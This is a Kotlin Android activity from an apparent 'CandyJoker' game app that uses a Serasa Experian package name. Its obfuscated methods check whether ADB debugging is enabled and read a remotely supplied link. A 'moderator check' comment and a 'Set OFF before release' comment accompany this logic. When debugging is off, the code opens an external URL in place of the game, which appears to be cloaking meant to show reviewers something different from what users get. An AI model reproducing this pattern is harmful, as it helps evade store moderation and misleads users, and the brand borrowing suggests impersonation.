package br.com.serasaexperian.consumido

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.lifecycle.lifecycleScope
import br.com.serasaexperian.consumido.data.SImpl
import br.com.serasaexperian.consumido.domain.S
import br.com.serasaexperian.consumido.domain.ConnectionChecker
import br.com.serasaexperian.consumido.domain.GDM
import br.com.serasaexperian.consumido.ui.panels.VisualDisplayUnit
import br.com.serasaexperian.consumido.ui.theme.CandyJokerTheme
import br.com.serasaexperian.consumido.viewmodels.CandyJockerViewModel
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import javax.inject.Inject


@AndroidEntryPoint
class CandyJockerActivity : ComponentActivity() {


    @Inject
    lateinit var candyJockerViewModel: CandyJockerViewModel

    @Inject
    lateinit var generalDataManager: GDM

    @Inject
    lateinit var candyJockerStorage: S

    @Inject
    lateinit var connectionChecker: ConnectionChecker

    private val requestPermission = registerForActivityResult(ActivityResultContracts.RequestPermission()){
        cn()
    }


    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            CandyJokerTheme {
                // A surface container using the 'background' color from the themes
                VisualDisplayUnit(candyJockerViewModel)
            }
        }

        catsp()

    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun catsp() {
        val isConnected = connectionChecker.isConnectionExist(this)
        if (isConnected){
            requestPermission()
        } else {
            //go to the no internet screen
            d()
        }
    }

    private fun d(mode: String = STANDART) {
        val assqw = Intent(this, NoConnectionActivity::class.java)

        if (mode == SPECIAL){
            //put link to the intent
            val version = candyJockerStorage.readPolicyDestination()
            assqw.putExtra(SImpl.POLICY, version)
        }

        startActivity(assqw)
    }

    private fun cn() {
        val version = candyJockerStorage.readPolicyDestination()

        //check moderator check link

        if (!version.startsWith("htt") && !version.startsWith("no_")){
            //build link and add listenner to compose Loading screen Element 7

            lifecycleScope.launch {
                s12()
                delay(2000)
                candyJockerViewModel.spp(generalDataManager, this@CandyJockerActivity)
            }




        } else if(version.startsWith("no_")){
            candyJockerViewModel.postStatusOnOff(GDM.ON)
        } else {
            d(SPECIAL)
        }
    }

    private fun s12() {

        val iToN = Intent(this, NoConnectionActivity::class.java)

        candyJockerViewModel.liveElements.observe(this){ listOfElements ->
            listOfElements.forEach {
                if(it.id == 7 && it.description.startsWith("htt")){
                    iToN.putExtra(SImpl.POLICY, it.description)
                    startActivity(iToN)
                }
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun requestPermission(){
        val adb = generalDataManager.cdmklmlk(this)

        //Set OFF before release
        if (adb == GDM.OFF){
            //ask permission
            candyJockerViewModel.postStatusOnOff(GDM.OFF)
            val permission = android.Manifest.permission.POST_NOTIFICATIONS
            requestPermission.launch(permission)
        } else {
            //adb is ON
            //post data to vm
            candyJockerViewModel.postStatusOnOff(GDM.ON)
        }
    }


    companion object{
        const val STANDART = "standart"
        const val SPECIAL = "special"
    }
}